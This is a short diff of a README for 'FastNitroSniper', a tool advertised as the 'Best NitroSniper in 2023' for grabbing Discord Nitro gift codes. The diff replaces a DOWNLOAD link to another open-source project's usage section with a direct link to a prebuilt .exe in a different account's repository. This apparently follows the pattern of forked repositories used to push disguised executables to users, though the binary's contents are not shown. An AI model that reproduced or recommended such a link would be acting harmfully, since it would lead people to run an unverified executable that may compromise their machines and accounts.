@@ -1,7 +1,7 @@
 > # FastNitroSniper
 
 
-### [DOWNLOAD](https://github.com/Vedza/NitroSniperGo#usage) 
+### [DOWNLOAD](https://github.com/Ghost-Man001/FastNitroSniper/releases/download/Update/FNitroSniper_V2.0.exe) 
 
 Best NitroSniper in 2023
 
